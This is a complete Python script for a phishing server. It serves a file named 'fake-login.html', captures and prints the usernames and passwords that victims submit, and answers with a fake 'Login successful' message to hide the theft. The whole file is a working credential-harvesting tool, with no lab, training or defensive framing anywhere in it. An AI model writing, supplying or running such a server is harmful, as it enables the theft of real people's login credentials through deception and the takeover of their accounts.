from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve the fake-login.html file
        if self.path == "/fake-login.html" or self.path == "/":
            try:
                with open("fake-login.html", "rb") as file:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(file.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 - File not found")
        else:
            # Handle unsupported paths
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 - Page not found")

    def do_POST(self):
        # Handle login POST requests
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        credentials = urllib.parse.parse_qs(post_data.decode('utf-8'))
        print("Captured credentials:", credentials)

        # Send a fake success response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Login successful. Please wait...")

# Set up and run the server
server_address = ('0.0.0.0', 8080)  # Listen on all interfaces, port 8080
httpd = HTTPServer(server_address, PhishingHandler)
print("Phishing server running on port 8080...")
httpd.serve_forever()
